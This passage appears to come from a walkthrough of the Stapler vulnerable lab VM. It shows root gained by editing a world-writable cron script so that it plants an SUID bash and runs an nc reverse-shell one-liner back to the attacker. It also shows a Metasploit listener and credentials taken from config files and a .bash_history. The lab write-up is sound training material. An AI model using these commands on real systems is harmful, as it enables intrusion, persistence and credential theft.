+    </div>
+    <div>www@red:/var/www/https/blogblog/wp-content/uploads$ chmod +x thumbs</div>
+    <div>www@red:/var/www/https/blogblog/wp-content/uploads$ ./thumbs &amp;</div>
+    <div>[1] 25361</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Privilege Escalation</h2>
+</div>
+<div><br /></div>
+<div>We check the operating system info using uname.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www@red:~$ uname -a</div>
+    <div>Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</div>
+</div>
+<div><br /></div>
+<div>Looks like the exploit database has a known exploit for this version of Ubuntu + kernel... unfortunately... our victim is running x86 and this exploit is for x64.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter target_offset Out-of-Bounds Privilege Escalation        | exploits/linux_x86-64/local/40049.c</div>
+</div>
+<div><br /></div>
+<div>We have another couple of exploits that might work...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                       | exploits/linux/local/44298.c</div>
+    <div>Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)        | exploits/linux/local/43418.c</div>
+</div>
+<div><br /></div>
+<div>...but they don't... at least not without some more work.</div>
+<div><br /></div>
+<div>Looking around in /usr/local, I notice there is a script that has wide open permissions.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www@red:/usr/local/sbin$ cat cron-logrotate.sh</div>
+    <div>#Simon, you really need to-do something about this</div>
+    <div>www@red:/usr/local/sbin$ ls -l</div>
+    <div>total 4</div>
+    <div>-rwxrwxrwx 1 root root 51 Jun  3  2016 cron-logrotate.sh</div>
+</div>
+<div><br /></div>
+<div>Jumping back to /etc, I did a search to see if root ever executes this file (since I can edit it).</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www@red:/etc$ grep -ri 'cron-logrotate' * 2&gt;&amp;1 | grep -v "Permission denied"</div>
+    <div>cron.d/logrotate:*/5 *   * * *   root  /usr/local/sbin/cron-logrotate.sh</div>
+</div>
+<div><br /></div>
+<div>Nice. Root runs this script (that I can edit) every 5 minutes. This should be easy.</div>
+<div><br /></div>
+<div>I'll create a file with the commands I want root to run for me. I'll even leave the original comment in the file. This should copy /bin/bash to /tmp and then set the sticky bit so any user can run it as root. I'll also go ahead and have a reverse shell connect back to my attacker (since the cron job runs every 5 mins, this is also another way to 'Maintain Access').</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/stapler# cat cron-logrotate.sh</div>
+    <div>#Simon, you really need to-do something about this</div>
+    <div>cp /bin/bash /tmp</div>
+    <div>chmod u+s /tmp/bash</div>
+    <div>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.183.0.222 5434 &gt;/tmp/f</div>
+</div>
+<div><br /></div>
+<div>Now I'll start the python SimpleHTTPServer like before and pull down the file to the victim (overwriting the original).</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www@red:/usr/local/sbin$ wget -O cron-logrotate.sh 10.183.0.222:4321/cron-logrotate.sh</div>
+    <div>--2019-04-20 01:46:06--  http://10.183.0.222:4321/cron-logrotate.sh</div>
+    <div>Connecting to 10.183.0.222:4321... connected.</div>
+    <div>HTTP request sent, awaiting response... 200 OK</div>
+    <div>Length: 89 [text/x-sh]</div>
+    <div>Saving to: 'cron-logrotate.sh'</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>cron-logrotate.sh   100%[===================&gt;]      89  --.-KB/s    in 0s      </div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>utime(cron-logrotate.sh): Operation not permitted</div>
+    <div>2019-04-20 01:46:06 (20.0 MB/s) - 'cron-logrotate.sh' saved [89/89]</div>
+</div>
+<div><br /></div>
+<div>Now we wait until bash shows up in /tmp. We can also set up a listener in Metasploit for our reverse shell.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div>
+    <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
+    <div>payload =&gt; generic/shell_reverse_tcp</div>
+    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
+    <div>LHOST =&gt; 10.183.0.222</div>
+    <div>msf5 exploit(multi/handler) &gt; set LPORT 5434</div>
+    <div>LPORT =&gt; 5434</div>
+    <div>msf5 exploit(multi/handler) &gt; run -j</div>
+    <div>[*] Exploit running as background job 4.</div>
+    <div>[*] Exploit completed, but no session was created.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[*] Started reverse TCP handler on 10.183.0.222:5434</div>
+</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www@red:/tmp$ ls -l</div>
+    <div>total 1084</div>
+    <div>-rwsr-xr-x 1 root root 1109564 Apr 20 01:50 bash</div>
+</div>
+<div><br /></div>
+<div>Now that our SUID enabled bash is in /tmp, all we have to do is run it with the -p option.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www@red:/tmp$ ./bash -p</div>
+    <div>bash-4.3# id</div>
+    <div>uid=1028(www) gid=1028(www) euid=0(root) groups=1028(www)</div>
+</div>
+<div><br /></div>
+<div>Why does this work? What does '-p' mean? From the bash man page.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>If  the  shell  is  started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, no</div>
+    <div>startup files are read, shell functions are not inherited from the environment, the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE  variables,</div>
+    <div>if  they appear in the environment, are ignored, and the effective user id is set to the real user id.  If the -p option is supplied at in‐</div>
+    <div>vocation, the startup behavior is the same, <span style="font-weight: bold; text-decoration: underline;">but the effective user id is not reset</span>.</div>
+</div>
+<div><br /></div>
+<div>As you can see from the output of the 'id' command, the effective user id (euid) is 0 (root).</div>
+<div><br /></div>
+<div>All that's left to do now is get the flag from /root.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>bash-4.3# cd /root</div>
+    <div>bash-4.3# cat flag.txt</div>
+    <div>~~~~~~~~~~&lt;(Congratulations)&gt;~~~~~~~~~~</div>
+    <div>                          .-'''''-.</div>
+    <div>                          |'-----'|</div>
+    <div>                          |-.....-|</div>
+    <div>                          |       |</div>
+    <div>                          |       |</div>
+    <div>         _,._             |       |</div>
+    <div>    __.o`   o`"-.         |       |</div>
+    <div> .-O o `"-.o   O )_,._    |       |</div>
+    <div>( o   O  o )--.-"`O   o"-.`'-----'`</div>
+    <div> '--------'  (   o  O    o)  </div>
+    <div>              `----------`</div>
+    <div>b6b545dc11b7a270f4bad23432190c75162c4a2b</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Pivoting</h2>
+</div>
+<div>N/A</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Clean Up</h2>
+</div>
+<div><br /></div>
+<div>*** REMOVE /home/www/rev.php ***</div>
+<div>*** STOP /var/www/https/blogblog/wp-content/uploads/thumbs ***</div>
+<div>*** REMOVE /var/www/https/blogblog/wp-content/uploads/thumbs ***</div>
+<div>*** CLEAN OUT /usr/local/sbin/cron-logrotate.sh ***</div>
+<div>*** REMOVE /tmp/bash ***</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Additional Info</h2>
+</div>
+<div><br /></div>
+<div><span style="font-weight: bold;">WordPress DB Creds</span></div>
+<div><br /></div>
+<div>We were able to obtain the wordpress database credentials from the wp-config.php file in /var/www/https/blogblog.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>[...]</div>
+    <div>// ** MySQL settings - You can get this info from your web host ** //</div>
+    <div>/** The name of the database for WordPress */</div>
+    <div>define('DB_NAME', 'wordpress');  </div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>/** MySQL database username */   </div>
+    <div>define('DB_USER', 'root');</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>/** MySQL database password */   </div>
+    <div>define('DB_PASSWORD', 'plbkac');</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>/** MySQL hostname */</div>
+    <div>define('DB_HOST', 'localhost');</div>
+    <div>[...]</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div><span style="font-weight: bold;">phpMyAdmin DB Creds</span></div>
+<div><br /></div>
+<div>We are able to obtain the phpmyadmin database credentials from the config-db.php file in /etc/phpmyadmin.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>bash-4.3# cd /etc/phpmyadmin</div>
+    <div>bash-4.3# cat config-db.php</div>
+    <div>&lt;?php</div>
+    <div>##</div>
+    <div>## database access settings in php format</div>
+    <div>## automatically generated from /etc/dbconfig-common/phpmyadmin.conf</div>
+    <div>## by /usr/sbin/dbconfig-generate-include</div>
+    <div>##</div>
+    <div>## by default this file is managed via ucf, so you shouldn't have to</div>
+    <div>## worry about manual changes being silently discarded.  *however*,</div>
+    <div>## you'll probably also want to edit the configuration file mentioned</div>
+    <div>## above too.</div>
+    <div>##</div>
+    <div>$dbuser='phpmyadmin';</div>
+    <div>$dbpass='FbvmqOhR4Z5y';</div>
+    <div>$basepath='';</div>
+    <div>$dbname='phpmyadmin';</div>
+    <div>$dbserver='localhost';</div>
+    <div>$dbport='';</div>
+    <div>$dbtype='mysql';</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div><span style="font-weight: bold;">TCP port 666</span></div>
+<div><br /></div>
+<div>We notice that nmap reported lots of junk from the service on TCP port 666. Let's use netcat to catch the binary data being spewed on this port and see what it might be.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/stapler# nc 10.183.0.194 666 &gt; binary</div>
+    <div>root@kali:~/Walkthroughs/stapler# vim binary</div>
+</div>
+<div><br /></div>
+<div>Opening the file in vim, we notice the first characters are 'PK', which typically indicates a ZIP file. We add the '.zip' extension and run zipinfo to see what we've got.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/stapler# mv binary binary.zip</div>
+    <div>root@kali:~/Walkthroughs/stapler# zipinfo binary.zip </div>
+    <div>Archive:  binary.zip</div>
+    <div>Zip file size: 11608 bytes, number of entries: 1</div>
+    <div>-rw-r--r--  3.0 unx    12821 bx defX 16-Jun-03 11:03 message2.jpg</div>
+    <div>1 file, 12821 bytes uncompressed, 11434 bytes compressed:  10.8%</div>
+</div>
+<div><br /></div>
+<div>We extract message2.jpg and this is what we get.</div>
+<div><br /></div>
+<div><img height="77" src="/assets/images/2019-04-15-stapler/message2.jpg" width="364" /><br /></div>
+<div><br /></div>
+<div>Scott is a WordPress user.</div>
+<div><br /></div>
+<div>We also check the exif data in the image.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/stapler# exiftool message2.jpg </div>
+    <div>ExifTool Version Number         : 11.16</div>
+    <div>File Name                       : message2.jpg</div>
+    <div>Directory                       : .</div>
+    <div>File Size                       : 13 kB</div>
+    <div>File Modification Date/Time     : 2016:06:03 11:03:07-04:00</div>
+    <div>File Access Date/Time           : 2019:04:19 17:01:52-04:00</div>
+    <div>File Inode Change Date/Time     : 2019:04:19 17:01:11-04:00</div>
+    <div>File Permissions                : rw-r--r--</div>
+    <div>File Type                       : JPEG</div>
+    <div>File Type Extension             : jpg</div>
+    <div>MIME Type                       : image/jpeg</div>
+    <div>JFIF Version                    : 1.01</div>
+    <div>Resolution Unit                 : None</div>
+    <div>X Resolution                    : 72</div>
+    <div>Y Resolution                    : 72</div>
+    <div>Current IPTC Digest             : 020ab2da2a37c332c141ebf819e37e6d</div>
+    <div>Contact                         : If you are reading this, you should get a cookie!</div>
+    <div>Application Record Version      : 4</div>
+    <div>IPTC Digest                     : d41d8cd98f00b204e9800998ecf8427e</div>
+    <div>Image Width                     : 364</div>
+    <div>Image Height                    : 77</div>
+    <div>Encoding Process                : Baseline DCT, Huffman coding</div>
+    <div>Bits Per Sample                 : 8</div>
+    <div>Color Components                : 3</div>
+    <div>Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)</div>
+    <div>Image Size                      : 364x77</div>
+    <div>Megapixels                      : 0.028</div>
+</div>
+<div><br /></div>
+<div>This Contact field comment plus Scott being mentioned in the image ties together something we already know (through brute force). Scott's WordPress password is 'cookie'.</div>
+<div><br /></div>
+<div><br /></div>
+<div><span style="font-weight: bold;">phpMyAdmin Setup</span></div>
+<div><br /></div>
+<div>The phpMyAdmin Setup site is available here: <a href="https://10.183.0.194:12380/phpmyadmin/setup">https://10.183.0.194:12380/phpmyadmin/setup</a></div>
+<div><br /></div>
+<div>The /etc/phpmyadmin/htpasswd.setup file contains the following.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@red:/etc/phpmyadmin# cat htpasswd.setup</div>
+    <div>admin:*</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div><span style="font-weight: bold;">JKanode</span></div>
+<div><br /></div>
+<div>Looking in the /root directory, there is a python.sh script that appears to be starting python's SimpleHTTPServer on TCP port 8888. That port wasn't open in our nmap scan and we can't connect to it because it is being redirected to /dev/null (intentionally or unintentionally). Regardless, we see that it is serving files out of /home/JKanode. That makes that directory interesting. Taking a look there, we only see hidden bash related files, but the .bash_history file has some interesting entries. In fact, it has SSH credentials for two users (JKanode and peter). We've seen that Peter is an admin on the WordPress site and was listed in the SMB users as well. We also saw that his account is in many 'admin' groups in /etc/group. So, that's a nice account to have credentials for... even though we already have root.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@red:~# cat python.sh</div>
+    <div>#!/bin/bash</div>
+    <div>su -c 'cd /home/JKanode; python2 -m SimpleHTTPServer 8888 &amp;&gt;/dev/null' JKanode &amp;&gt;/dev/null</div>
+    <div>root@red:~# cd /home/JKanode</div>
+    <div>root@red:/home/JKanode# ls -a</div>
+    <div>.</div>
+    <div>..</div>
+    <div>.bash_history</div>
+    <div>.bash_logout</div>
+    <div>.bashrc</div>
+    <div>.profile</div>
+    <div>root@red:/home/JKanode# cat .bash_history</div>
+    <div>cat .bash_history</div>
+    <div>id</div>
+    <div>whoami</div>
+    <div>ls -lah</div>
+    <div>pwd</div>
+    <div>ps aux</div>
+    <div>sshpass -p thisimypassword ssh JKanode@localhost</div>
+    <div>apt-get install sshpass</div>
+    <div>sshpass -p JZQuyIN5 peter@localhost</div>
+    <div>ps -ef</div>
+    <div>top</div>
+    <div>kill -9 3747</div>
+    <div>exit</div>
+</div>
+<div><br /></div>
+<div>Logging in as (via SSH) as Peter, we can see all the permissions his account has.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>red% id</div>
+    <div>uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)</div>
+</div>
+<div><br /></div>
+<div>Seeing sudo in the list, we decide to see what Peter can do using sudo...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>red% sudo -l</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>We trust you have received the usual lecture from the local System</div>
+    <div>Administrator. It usually boils down to these three things:</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>    #1) Respect the privacy of others.</div>
+    <div>    #2) Think before you type.</div>
+    <div>    #3) With great power comes great responsibility.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[sudo] password for peter: </div>
+    <div>Matching Defaults entries for peter on red:</div>
+    <div>    lecture=always, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>User peter may run the following commands on red:</div>
+    <div>    (ALL : ALL) ALL</div>
+</div>
+<div><br /></div>
+<div>Anything he wants! If we didn't already have root, this would be a way to get it.</div>
+<div><br /></div>
